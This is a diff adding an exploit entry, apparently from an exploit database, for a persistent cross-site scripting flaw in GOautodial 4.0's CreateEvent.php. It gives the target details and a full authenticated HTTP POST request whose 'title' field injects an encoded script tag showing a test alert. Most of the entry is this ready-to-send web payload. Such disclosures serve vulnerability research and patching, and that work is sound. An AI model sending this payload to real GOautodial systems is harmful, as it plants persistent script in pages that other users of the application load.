@@ -1,0 +1,29 @@
+# Exploit Title: GOautodial 4.0 - 'CreateEvent' Persistent Cross-Site Scripting
+# Author: Cakes
+# Discovery Date: 2019-09-19
+# Vendor Homepage: https://goautodial.org/
+# Software Link: https://downloads2.goautodial.org/centos/7/isos/x86_64/GOautodial-4-x86_64-Pre-Release-20180929-0618.iso
+# Tested Version: 4.0
+# Tested on OS: CentOS 7
+# CVE: N/A
+
+# Discription:
+# Simple XSS attack after application authentication. 
+
+# POST Request
+
+POST /php/CreateEvent.php HTTP/1.1
+Host: 10.0.0.25
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://10.0.0.25/events.php
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 69
+Cookie: PHPSESSID=b9jgg31ufmmgf84qdd6jq6v3i1
+Connection: close
+DNT: 1
+
+title=%3Cscript%3Ealert(%22TEST%22)%3B%3C%2Fscript%3E&color=%2300c0ef
